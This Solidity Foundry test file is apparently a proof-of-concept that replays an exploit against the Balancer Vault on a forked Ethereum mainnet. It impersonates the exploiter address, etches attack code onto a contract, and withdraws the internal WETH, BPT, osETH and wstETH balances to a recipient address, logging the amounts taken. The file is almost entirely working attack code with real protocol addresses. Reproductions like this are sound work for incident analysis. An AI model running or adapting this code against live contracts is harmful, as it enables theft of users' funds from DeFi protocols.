// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
    function owner() external view returns (address);
}

enum UserBalanceOpKind {
    DEPOSIT_INTERNAL,
    WITHDRAW_INTERNAL,
    TRANSFER_INTERNAL,
    TRANSFER_EXTERNAL
}

struct UserBalanceOp {
    UserBalanceOpKind kind;
    address asset;
    uint256 amount;
    address sender;
    address payable recipient;
}
interface Ivault {
    function getInternalBalance(
        address user,
        IERC20[] memory tokens
    ) external view returns (uint256[] memory balances);
    function getPoolTokens(
        bytes32 poolId
    )
        external
        view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );
    function manageUserBalance(UserBalanceOp[] memory ops) external payable;
}
contract BalancerPoC is Test {
    function setUp() public {
        vm.createSelectFork();
    }
    function testExploit() public {
        address exploiter = 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207;
        address CA = 0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d;
        vm.rollFork(23717404 - 1);
        vm.startPrank(exploiter);
        Attack tmp = new Attack();
        bytes memory code = address(tmp).code;
        vm.etch(CA, code);
        Attack att = Attack(CA);
        att.func_0x8a4f75d6(
            address(0xDACf5Fa19b1f720111609043ac67A9818262850c),
            address(0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD)
        );
    }
}

contract Attack {
    address constant Vault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant BPT = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant osETH = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
    address constant BPT2 = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant _recipient = 0xAa760D53541d8390074c61DEFeaba314675b8e3f;

    function func_0x8a4f75d6(address addr1, address addr2) public {
        bytes32 poolId = bytes32(abi.encodePacked(addr1, uint96(1589)));
        bytes32 poolId2 = bytes32(abi.encodePacked(addr2, uint96(1474)));

        Ivault(Vault).getPoolTokens(poolId);

        IERC20[] memory _tokens = new IERC20[](3);
        _tokens[0] = IERC20(WETH);
        _tokens[1] = IERC20(BPT);
        _tokens[2] = IERC20(osETH);

        uint[] memory _amounts = new uint[](3);
        _amounts = Ivault(Vault).getInternalBalance(address(this), _tokens);

        UserBalanceOp[] memory ops = new UserBalanceOp[](3);
        ops[0] = UserBalanceOp({
            kind: UserBalanceOpKind.WITHDRAW_INTERNAL,
            asset: address(_tokens[0]),
            amount: _amounts[0],
            sender: address(this),
            recipient: payable(_recipient)
        });

        ops[1] = UserBalanceOp({
            kind: UserBalanceOpKind.WITHDRAW_INTERNAL,
            asset: address(_tokens[1]),
            amount: _amounts[1],
            sender: address(this),
            recipient: payable(_recipient)
        });

        ops[2] = UserBalanceOp({
            kind: UserBalanceOpKind.WITHDRAW_INTERNAL,
            asset: address(_tokens[2]),
            amount: _amounts[2],
            sender: address(this),
            recipient: payable(_recipient)
        });
        Ivault(Vault).manageUserBalance(ops);

        for (uint i = 0; i < 3; i++) {
            console.log("mytoken i", address(_tokens[i]));
            uint balance = IERC20(_tokens[i]).balanceOf(_recipient);
            console.log("mybal i", balance / 1e18);
        }

        Ivault(Vault).getPoolTokens(poolId2);
        _tokens[0] = IERC20(wstETH);
        _tokens[1] = IERC20(BPT2);
        _tokens[2] = IERC20(WETH);
        _amounts = Ivault(Vault).getInternalBalance(address(this), _tokens);

        ops[0] = UserBalanceOp({
            kind: UserBalanceOpKind.WITHDRAW_INTERNAL,
            asset: address(_tokens[0]),
            amount: _amounts[0],
            sender: address(this),
            recipient: payable(_recipient)
        });

        ops[1] = UserBalanceOp({
            kind: UserBalanceOpKind.WITHDRAW_INTERNAL,
            asset: address(_tokens[1]),
            amount: _amounts[1],
            sender: address(this),
            recipient: payable(_recipient)
        });

        ops[2] = UserBalanceOp({
            kind: UserBalanceOpKind.WITHDRAW_INTERNAL,
            asset: address(_tokens[2]),
            amount: _amounts[2],
            sender: address(this),
            recipient: payable(_recipient)
        });
        Ivault(Vault).manageUserBalance(ops);

        for (uint i = 0; i < 3; i++) {
            console.log("mytoken i", address(_tokens[i]));
            uint balance = _tokens[i].balanceOf(_recipient);
            console.log("mybal i", balance / 1e18);
        }
    }
}
